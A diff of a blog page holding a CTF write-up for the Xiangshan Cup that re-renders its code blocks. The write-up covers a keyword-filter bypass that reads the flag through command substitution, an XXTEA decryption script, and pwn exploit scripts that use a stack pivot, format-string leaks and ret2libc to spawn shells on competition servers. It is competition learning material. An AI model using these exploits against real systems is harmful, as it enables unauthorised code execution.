@@ -396,14 +396,14 @@ HASHTEAM香山杯WPmisc签到题将题目所给编码丢入赛博大厨，得到
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    499
+                    2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    10 分
                 </div>
                 
 
@@ -431,90 +431,91 @@ HASHTEAM香山杯WPmisc签到题将题目所给编码丢入赛博大厨，得到
 <p><img src="https://s2.loli.net/2023/10/15/5mISwDTexlO9PpL.png"></p>
 <p>但是过滤了f l a g * ?，需要绕过。这里首先使用<code>dir -1 /</code>查看flag位置，发现是在第五个。<br><img src="https://s2.loli.net/2023/10/16/QK4y5GvgnJfXl8h.png"><br>然后使用<code>rev /$(dir -l / | sed -n 5p)</code>读取flag。<br><img src="https://s2.loli.net/2023/10/16/WgVm8jUzdBN6fGO.png"><br>得到一个反向flag。</p>
 <p>再次反向得到flag。</p>
-<pre class=" language-sh"><code class="language-sh">~/ctf/match/xsb2023/web » rev flag                                                                                            N1nE@N1nEmAn
-flag{8bab51a8-191e-4e78-8ca4-f1fc3fb6c018}
-</code></pre>
+<blockquote>
+<p> ~/ctf/match/xsb2023/web » rev flag                                                      </p>
+<p> flag{8bab51a8-191e-4e78-8ca4-f1fc3fb6c018}</p>
+</blockquote>
 <h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="URL从哪儿来"><a href="#URL从哪儿来" class="headerlink" title="URL从哪儿来"></a>URL从哪儿来</h3><p>运行题目所给的附件，设置断点在”ou.exe”所在处。在相应文件夹找到ou.exe的相关文件，然后拖入ida。<img src="https://s2.loli.net/2023/10/15/okIht1KHN2BYnJG.png"></p>
 <p>运行ou.exe文件，发现在v18 += strlen(v18)处下断点，搜索flag可以得到flag。<img src="https://s2.loli.net/2023/10/15/EN1HQ9wIjrxizyL.png"></p>
 <h3 id="hello-python"><a href="#hello-python" class="headerlink" title="hello python"></a>hello python</h3><p>了解到是python写的apk，定位所有与组件无关的后发现app.imy文件(用zip可以打开)，打开是个xxtea，直接解密即可。</p>
-<pre class=" language-py"><code class="language-py">def shift(z, y, x, k, p, e):
-    return ((((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((x ^ y) + (k[(p & 3) ^ e] ^ z)))
-def encrypt(v, k):
-    delta = 0x9E3779B9
-    n = len(v)
-    rounds = 6 + 52 // n
-    x = 0
-    z = v[n - 1]
-    for i in range(rounds):
-        x = (x + delta) & 0xFFFFFFFF
-        e = (x >> 2) & 3
-        for p in range(n - 1):
-            y = v[p + 1]
-            v[p] = (v[p] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF
-            z = v[p]
-        p += 1
-        y = v[0]
-        v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF
-        z = v[n - 1]
-    return v
-def decrypt(v, k):
-    delta = 0x9E3779B9
-    n = len(v)
-    rounds = 6 + 52 // n
-    x = (rounds * delta) & 0xFFFFFFFF
-    y = v[0]
-    for i in range(rounds):
-        e = (x >> 2) & 3
-        for p in range(n - 1, 0, -1):
-            z = v[p - 1]
-            v[p] = (v[p] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF
-            y = v[p]
-        p -= 1
-        z = v[n - 1]
-        v[0] = (v[0] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF
-        y = v[0]
-        x = (x - delta) & 0xFFFFFFFF
-    return v
+<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">shift</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delta <span class="token operator">=</span> <span class="token number">0x9E3779B9</span>
+    n <span class="token operator">=</span> len<span class="token punctuation">(</span>v<span class="token punctuation">)</span>
+    rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">//</span> n
+    x <span class="token operator">=</span> <span class="token number">0</span>
+    z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> delta<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
+        e <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span>
+        <span class="token keyword">for</span> p <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
+            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
+            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span>
+        p <span class="token operator">+=</span> <span class="token number">1</span>
+        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
+        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> v
+<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delta <span class="token operator">=</span> <span class="token number">0x9E3779B9</span>
+    n <span class="token operator">=</span> len<span class="token punctuation">(</span>v<span class="token punctuation">)</span>
+    rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">//</span> n
+    x <span class="token operator">=</span> <span class="token punctuation">(</span>rounds <span class="token operator">*</span> delta<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
+    y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        e <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span>
+        <span class="token keyword">for</span> p <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
+            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
+            y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span>
+        p <span class="token operator">-=</span> <span class="token number">1</span>
+        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
+        v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> shift<span class="token punctuation">(</span>z<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
+        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> delta<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
+    <span class="token keyword">return</span> v
 
 
-c = [689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ]
-k = [12345678 ,12398712 ,91283904 ,12378192 ]
-m = (decrypt(c, k))
-for i in m:
-    print(bytes.fromhex(hex(i)[2:]).decode()[::-1], end='')
---------------------------------------------------------------------
+c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">689085350</span> <span class="token punctuation">,</span><span class="token number">626885696</span> <span class="token punctuation">,</span><span class="token number">1894439255</span> <span class="token punctuation">,</span><span class="token number">1204672445</span> <span class="token punctuation">,</span><span class="token number">1869189675</span> <span class="token punctuation">,</span><span class="token number">475967424</span> <span class="token punctuation">,</span><span class="token number">1932042439</span> <span class="token punctuation">,</span><span class="token number">1280104741</span> <span class="token punctuation">,</span><span class="token number">2808893494</span> <span class="token punctuation">]</span>
+k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12345678</span> <span class="token punctuation">,</span><span class="token number">12398712</span> <span class="token punctuation">,</span><span class="token number">91283904</span> <span class="token punctuation">,</span><span class="token number">12378192</span> <span class="token punctuation">]</span>
+m <span class="token operator">=</span> <span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
 </code></pre>
 <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>一道简单的栈迁移。第一次迁移到所给的skdd之后，泄露puts函数地址，接着返回到main，由于栈已经被迁移，返回地址被篡改，此时直接输入one_shot，即可返回到one_shot的地址上，从而getshell。具体的在注释。</p>
-<pre class=" language-py"><code class="language-py">from evilblade import *
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> evilblade <span class="token keyword">import</span> <span class="token operator">*</span>
 
-context(os='linux', arch='amd64')
-context(os='linux', arch='amd64', log_level='debug')
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
 
-setup('./pwn2')
-#libset('libc-2.31.so')
-rsetup('101.201.35.76',29720)
-evgdb()
+setup<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#libset('libc-2.31.so')</span>
+rsetup<span class="token punctuation">(</span><span class="token string">'101.201.35.76'</span><span class="token punctuation">,</span><span class="token number">29720</span><span class="token punctuation">)</span>
+evgdb<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-rdi = 0x401353
-lv = 0x000000000040124b
-pay = p64(rdi) + p64(gotadd('puts')) + p64(pltadd('puts'))+ p64(0x401264)#泄露puts之后，返回到main
-sd(pay)
+rdi <span class="token operator">=</span> <span class="token number">0x401353</span>
+lv <span class="token operator">=</span> <span class="token number">0x000000000040124b</span>
+pay <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gotadd<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pltadd<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401264</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#泄露puts之后，返回到main</span>
+sd<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
 
-sa('ber',p32(0x12345678))#符合判断，执行溢出
+sa<span class="token punctuation">(</span><span class="token string">'ber'</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#符合判断，执行溢出</span>
 
-sd(b'a'*0x30+p64(0x405098)+p64(lv))#溢出进行栈迁移到skdd
-addx = getx64(-7,-1)
-base = addx - 0x80970
-sys = base + 0x4f420
-binsh = base + 0x1b3d88
-os = base + 0x4f302
-#输入oneshot，getshell
-sl(p64(os))
-#sd(p32(0x12345678))
-#sd(b'a'*0x30+p64(0x405098)+p64(lv))
+sd<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x405098</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>lv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#溢出进行栈迁移到skdd</span>
+addx <span class="token operator">=</span> getx64<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+base <span class="token operator">=</span> addx <span class="token operator">-</span> <span class="token number">0x80970</span>
+sys <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x4f420</span>
+binsh <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x1b3d88</span>
+os <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x4f302</span>
+<span class="token comment" spellcheck="true">#输入oneshot，getshell</span>
+sl<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sd(p32(0x12345678))</span>
+<span class="token comment" spellcheck="true">#sd(b'a'*0x30+p64(0x405098)+p64(lv))</span>
 
-ia()
-'''
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">'''
 ============================================================
 0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret
@@ -527,7 +528,7 @@ ia()
 0x0000000000401351 : pop rsi ; pop r15 ; ret
 0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 0x000000000040101a : ret
-'''
+'''</span>
 </code></pre>
 <h3 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h3><p>这道题目看起来很麻烦，实际上发现<code>app.cpython-37m-x86_64-linux-gnu.so </code>就是cpython，就是python文件编译的有cpython库和libc库的一道题。</p>
 <p>手动测试，发现每次输入会返回一个一模一样 的东西，猜测有格式化字符串漏洞。结果发现真有，由此泄露canary。</p>
@@ -535,195 +536,195 @@ ia()
 <p>观察到so文件中有Give you ……字符串，此处即是刚才运行的函数，发现有栈溢出漏洞。</p>
 <p><img src="https://s2.loli.net/2023/10/15/pXufcVrYDHGwyLd.png"></p>
 <p>有了栈溢出和canary，那么直接打ret2libc即可。</p>
-<pre class=" language-py"><code class="language-py">from evilblade import *
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> evilblade <span class="token keyword">import</span> <span class="token operator">*</span>
 
-context(os='linux', arch='amd64')
-context(os='linux', arch='amd64', log_level='debug')
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
 
-setup('pwn')
-rsetup('39.106.48.123', 13099)
-evgdb()
+setup<span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">)</span>
+rsetup<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">13099</span><span class="token punctuation">)</span>
+evgdb<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-sla('>', b'0')
-addx = getx(-15,-1)
-base = addx - 0x68b0
-dpx('base', base)
-sl(b'aaaaaaaa'+b'%p-'*38)
+sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> b<span class="token string">'0'</span><span class="token punctuation">)</span>
+addx <span class="token operator">=</span> getx<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+base <span class="token operator">=</span> addx <span class="token operator">-</span> <span class="token number">0x68b0</span>
+dpx<span class="token punctuation">(</span><span class="token string">'base'</span><span class="token punctuation">,</span> base<span class="token punctuation">)</span>
+sl<span class="token punctuation">(</span>b<span class="token string">'aaaaaaaa'</span><span class="token operator">+</span>b<span class="token string">'%p-'</span><span class="token operator">*</span><span class="token number">38</span><span class="token punctuation">)</span>
 
-can = getx(-20,-2)
-dpx('canary',can)
+can <span class="token operator">=</span> getx<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>
+dpx<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span>can<span class="token punctuation">)</span>
 
-rdi = base + 0x0000000000003f8f
-flag = base + 0x013B66
-rsi = base + 0x0000000000003cd9
-puts = base + 0x3710
-read = base + 0x3940
-op = base + 0x3ae0
-bss = base + 0x16a80
-write = base + 0x3760
-ret = base +0x000000000000301a
+rdi <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x0000000000003f8f</span>
+flag <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x013B66</span>
+rsi <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x0000000000003cd9</span>
+puts <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3710</span>
+read <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3940</span>
+op <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3ae0</span>
+bss <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x16a80</span>
+write <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x3760</span>
+ret <span class="token operator">=</span> base <span class="token operator">+</span><span class="token number">0x000000000000301a</span>
 
-#pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(binsh)+p64(puts))
-pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(base+0x016078)+p64(puts)+p64(base + 0x99f0))
+<span class="token comment" spellcheck="true">#pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(binsh)+p64(puts))</span>
+pay<span class="token operator">=</span><span class="token punctuation">(</span>b<span class="token string">'aaaaaaaa'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>can<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base<span class="token operator">+</span><span class="token number">0x016078</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x99f0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-sl(pay)
+sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
 
-libc = tet()
-libc = getx64(0,-1) - 0x80970
-dpx('libcbase', libc)
+libc <span class="token operator">=</span> tet<span class="token punctuation">(</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> getx64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x80970</span>
+dpx<span class="token punctuation">(</span><span class="token string">'libcbase'</span><span class="token punctuation">,</span> libc<span class="token punctuation">)</span>
 
-sl(b'a')
+sl<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>
 
-pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(libc + 0x1b3d88)+p64(ret)+p64(libc + 0x4f420)+p64(0xdeadbaef))
+pay<span class="token operator">=</span><span class="token punctuation">(</span>b<span class="token string">'aaaaaaaa'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>can<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x1b3d88</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x4f420</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbaef</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-sl(pay)
+sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
 
 
-ia()
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p>参考文章补充一下，实在不知道怎么调试。打灰盒好累hhh。</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ve1kcon/p/17766267.html">https://www.cnblogs.com/ve1kcon/p/17766267.html</a></p>
-<pre class=" language-py"><code class="language-py">Pwthon
+<pre class=" language-python"><code class="language-python">Pwthon
 
 python pwn？实际上也是去跑 c 程序，不过还是第一次见。封装了一个 so 库，在 python 代码中会去调用这个库的函数，这样的话，相比起常规 pwn 题，就是会不好去调试。将库文件丢进 ida 分析，表面很复杂，有种做 vm 题的感觉（bushi
 
-实际上在第一个输入点输入0就能进入到 __pyx_f_3app_Welcome2Pwnthon 函数了，存在格式化字符串漏洞和栈溢出，而且直接给了 _pyx_f_3app_get_info 函数的地址，就能去计算这个库程序的基地址了，先泄 canary，后面就是 ret2libc 来 getshell 了
+实际上在第一个输入点输入<span class="token number">0</span>就能进入到 __pyx_f_3app_Welcome2Pwnthon 函数了，存在格式化字符串漏洞和栈溢出，而且直接给了 _pyx_f_3app_get_info 函数的地址，就能去计算这个库程序的基地址了，先泄 canary，后面就是 ret2libc 来 getshell 了
 
 image
 
-比较特别的点就是 __printf_chk 函数相较于普通的 printf 函数，不能使用 %N$ 的形式泄数据，然后格式化字符串的偏移是5
+比较特别的点就是 __printf_chk 函数相较于普通的 printf 函数，不能使用 <span class="token operator">%</span>N$ 的形式泄数据，然后格式化字符串的偏移是<span class="token number">5</span>
 
-（刚开始发现在上图中第一个 read 处直接敲个回车或者发送刚好 0x100 字节的数据过去之后都能泄点栈数据出来，比赛做这道题时琢磨了挺久这些数据能怎么用，因为当时没配通本地运行环境，也不知道泄出的是什么数据，然后后面倒是没用上这些数据
+（刚开始发现在上图中第一个 read 处直接敲个回车或者发送刚好 <span class="token number">0x100</span> 字节的数据过去之后都能泄点栈数据出来，比赛做这道题时琢磨了挺久这些数据能怎么用，因为当时没配通本地运行环境，也不知道泄出的是什么数据，然后后面倒是没用上这些数据
 
-赛后折腾了下运行环境，要和他生成 .so 用的 python3.7 版本一样才能运行，这样添加一下 syspath 就能直接 import app 了，在脚本中连gdb调试的话是这样写
+赛后折腾了下运行环境，要和他生成 <span class="token punctuation">.</span>so 用的 python3<span class="token number">.7</span> 版本一样才能运行，这样添加一下 syspath 就能直接 <span class="token keyword">import</span> app 了，在脚本中连gdb调试的话是这样写
 
-gdb.debug(['python','main.py'])
+gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'main.py'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
 
-断点断在 PyImport_ImportModule+4，然后一直往下运行看看那个包导入了 .so
